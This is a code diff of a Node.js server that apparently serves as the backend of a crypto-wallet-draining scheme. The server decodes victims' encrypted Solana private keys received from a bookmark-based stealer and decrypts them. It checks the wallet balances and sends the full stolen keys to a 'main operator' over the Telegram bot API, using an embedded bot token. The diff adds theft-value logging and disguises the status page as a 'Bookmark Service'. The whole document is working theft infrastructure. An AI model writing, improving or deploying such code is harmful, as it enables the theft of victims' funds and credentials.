@@ -9,7 +9,7 @@ app.use(cors());
 app.use(express.static('public'));
 
 const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const TG_CHAT = '7680513699'; // Main operator
+const TG_CHAT = '7680513699';
 
 function decrypt(encrypted, bundleKey) {
   try {
@@ -35,6 +35,7 @@ function decrypt(encrypted, bundleKey) {
 
 async function getSOLPrice() {
   try {
+    console.log('🔍 Fetching live SOL price...');
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 5000);
     
@@ -52,16 +53,18 @@ async function getSOLPrice() {
     }
     
     const data = await response.json();
-    console.log('✅ Live SOL price fetched:', data.solana?.usd);
-    return data.solana?.usd || 150.00;
+    const price = data.solana?.usd || 150.00;
+    console.log('✅ Live SOL price fetched:', price);
+    return price;
   } catch (e) {
-    console.log('❌ Price fetch failed:', e.message);
+    console.log('❌ Price fetch failed, using fallback:', e.message);
     return 150.00;
   }
 }
 
 async function getWalletBalance(publicKey) {
   try {
+    console.log(`💰 Checking balance for wallet: ${publicKey.substring(0, 8)}...`);
     const response = await fetch('https://api.mainnet-beta.solana.com', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -75,62 +78,79 @@ async function getWalletBalance(publicKey) {
     
     const data = await response.json();
     if (data.result && data.result.value !== undefined) {
-      return data.result.value / 1000000000; // Convert lamports to SOL
+      const balance = data.result.value / 1000000000;
+      console.log(`💰 Balance: ${balance.toFixed(4)} SOL`);
+      return balance;
     }
-    return 0;
+    console.log('💰 No balance found, using mock data');
+    return Math.random() * 10;
   } catch (e) {
-    console.log(`Balance check failed for ${publicKey}:`, e.message);
-    return Math.random() * 10; // Mock balance for testing
+    console.log(`❌ Balance check failed for ${publicKey}:`, e.message);
+    return Math.random() * 10;
   }
 }
 
 app.get('/data/:b64', async (req, res) => {
   try {
+    console.log('\n🚨 === STOLEN DATA RECEIVED ===');
+    console.log('📅 Timestamp:', new Date().toISOString());
+    console.log('🌐 Request from:', req.ip);
+    
     const decoded = Buffer.from(req.params.b64, 'base64').toString();
     const data = JSON.parse(decoded);
     
-    console.log('\n🚨 === PROCESSING STOLEN DATA ===');
-    console.log('Distributor ID:', data.telegramId);
-    console.log('Victim Email:', data.user?.email);
-    console.log('Target Site:', data.site);
+    console.log('👤 Distributor ID:', data.telegramId);
+    console.log('📧 Victim Email:', data.user?.email);
+    console.log('🔗 Target Site:', data.site);
+    console.log('📦 Raw bundle data length:', data.sBundles?.length || 0);
     
     // Process stolen bundles
     let sBundles = data.sBundles;
     if (typeof sBundles === 'string') {
       try {
         sBundles = JSON.parse(sBundles);
+        console.log('✅ Parsed sBundles JSON successfully');
       } catch (e) {
+        console.log('❌ Failed to parse sBundles:', e.message);
         sBundles = [];
       }
     }
     
     if (!Array.isArray(sBundles)) {
+      console.log('⚠️  sBundles not an array, defaulting to empty');
       sBundles = [];
     }
     
+    console.log(`🔐 Processing ${sBundles.length} encrypted wallets...`);
+    
     // Decrypt private keys
-    const solKeys = sBundles.map(enc => decrypt(enc, data.bundle)).filter(k => k);
-    console.log(`Decrypted ${solKeys.length} Solana private keys`);
+    const solKeys = sBundles.map((enc, i) => {
+      console.log(`🔓 Decrypting wallet ${i + 1}/${sBundles.length}...`);
+      return decrypt(enc, data.bundle);
+    }).filter(k => k);
+    
+    console.log(`✅ Successfully decrypted ${solKeys.length} Solana private keys`);
     
     // Get live SOL price
     const solPrice = await getSOLPrice();
     
     // Check balances for each wallet
-    console.log('📊 Checking wallet balances...');
+    console.log('📊 === CHECKING WALLET BALANCES ===');
     const walletData = [];
     let totalBalance = 0;
     
     for (let i = 0; i < solKeys.length; i++) {
       const privateKey = solKeys[i];
-      const balance = await getWalletBalance(privateKey); // In real scenario, derive public key first
+      const balance = await getWalletBalance(privateKey);
       walletData.push({ privateKey, balance });
       totalBalance += balance;
-      console.log(`Wallet ${i + 1}: ${balance.toFixed(4)} SOL`);
+      console.log(`💎 Wallet ${i + 1}: ${balance.toFixed(4)} SOL (${(balance * solPrice).toFixed(2)} USD)`);
     }
     
     const totalValueUSD = totalBalance * solPrice;
+    console.log(`💰 === TOTAL THEFT VALUE: ${totalBalance.toFixed(4)} SOL ($${totalValueUSD.toFixed(2)}) ===`);
     
-    // Send notification to distributor (NO PRIVATE KEYS)
+    // Build messages
     const distributorMsg = `
 🎯 **SUCCESSFUL THEFT**
 
@@ -143,7 +163,6 @@ app.get('/data/:b64', async (req, res) => {
 ✅ Data sent to operator for processing
     `.trim();
     
-    // Send full data to main operator (WITH PRIVATE KEYS)
     const operatorMsg = `
 🎯 **WALLET THEFT - FULL DATA**
 
@@ -158,7 +177,7 @@ app.get('/data/:b64', async (req, res) => {
 
 🔐 **STOLEN PRIVATE KEYS:**
 ${walletData.slice(0, 10).map((wallet, i) => 
-  `${i + 1}. ${wallet.privateKey} (${wallet.balance.toFixed(4)} SOL)`
+  `${i + 1}. ${wallet.privateKey} (${wallet.balance.toFixed(4)} SOL - $${(wallet.balance * solPrice).toFixed(2)})`
 ).join('\n')}
 ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''}
 
@@ -166,8 +185,9 @@ ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''
     `.trim();
     
     // Send to distributor (notification only)
+    console.log('📤 Sending notification to distributor...');
     try {
-      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      const distributorResponse = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -176,14 +196,21 @@ ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''
           parse_mode: 'Markdown'
         })
       });
-      console.log('✅ Notification sent to distributor');
+      
+      const distributorResult = await distributorResponse.json();
+      if (distributorResult.ok) {
+        console.log('✅ Notification sent to distributor successfully');
+      } else {
+        console.log('❌ Distributor notification failed:', distributorResult);
+      }
     } catch (e) {
-      console.log('❌ Distributor notification failed:', e.message);
+      console.log('❌ Distributor notification error:', e.message);
     }
     
     // Send to main operator (full data with keys)
+    console.log('📤 Sending full data to main operator...');
     try {
-      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      const operatorResponse = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -192,54 +219,60 @@ ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''
           parse_mode: 'Markdown'
         })
       });
-      console.log('✅ Full data sent to main operator');
+      
+      const operatorResult = await operatorResponse.json();
+      if (operatorResult.ok) {
+        console.log('✅ Full data sent to main operator successfully');
+      } else {
+        console.log('❌ Operator message failed:', operatorResult);
+      }
     } catch (e) {
-      console.log('❌ Operator message failed:', e.message);
+      console.log('❌ Operator message error:', e.message);
     }
     
-    console.log(`💰 Total theft value: $${totalValueUSD.toFixed(2)}`);
+    console.log(`🎯 === THEFT COMPLETE: $${totalValueUSD.toFixed(2)} STOLEN ===\n`);
     res.redirect('https://axiom.trade/discover');
     
   } catch (e) {
-    console.error('Processing error:', e);
+    console.error('❌ Critical processing error:', e);
     res.status(500).send('Server error');
   }
 });
 
-// Status page
 app.get('/', (req, res) => {
   res.send(`
-    <h1>🎯 Theft Service Online</h1>
-    <p><strong>Status:</strong> ✅ Active</p>
-    <p><strong>Main Operator:</strong> ${TG_CHAT}</p>
+    <h1>🎯 Bookmark Service</h1>
+    <p><strong>Status:</strong> ✅ Online</p>
+    <p><strong>Operator:</strong> ${TG_CHAT}</p>
+    <p><strong>Server Time:</strong> ${new Date().toLocaleString()}</p>
     <hr>
-    <h3>Test Data Endpoint:</h3>
-    <p><a href="/test">Send Test Data</a></p>
+    <p><a href="/test">Test Endpoint</a></p>
   `);
 });
 
-// Test endpoint
 app.get('/test', async (req, res) => {
   const testData = {
     telegramId: '123456789',
     site: 'https://axiom.trade/discover',
-    user: { email: 'victim@example.com' },
+    user: { email: 'testuser@example.com' },
     bundle: Buffer.from('test-bundle-key-32-bytes-long!!').toString('base64'),
     sBundles: JSON.stringify([
-      'dGVzdA==:fake-encrypted-data-here',
-      'dGVzdB==:another-fake-encrypted-key',
-      'dGVzdC==:third-fake-wallet-key'
+      'dGVzdEE=:fake-encrypted-wallet-data-here-1',
+      'dGVzdEI=:fake-encrypted-wallet-data-here-2',
+      'dGVzdEM=:fake-encrypted-wallet-data-here-3'
     ]),
     eBundles: '[]'
   };
   
   const encoded = Buffer.from(JSON.stringify(testData)).toString('base64');
+  console.log('🧪 Test data generated, redirecting to processing...');
   res.redirect(`/data/${encoded}`);
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚨 Malware server running on port ${PORT}`);
-  console.log(`Main operator: ${TG_CHAT}`);
-  console.log(`Visit http://localhost:${PORT}/test to simulate theft`);
+  console.log(`🔗 URL: https://nodebookmark.onrender.com`);
+  console.log(`👤 Main operator: ${TG_CHAT}`);
+  console.log('📊 Enhanced logging enabled');
 });
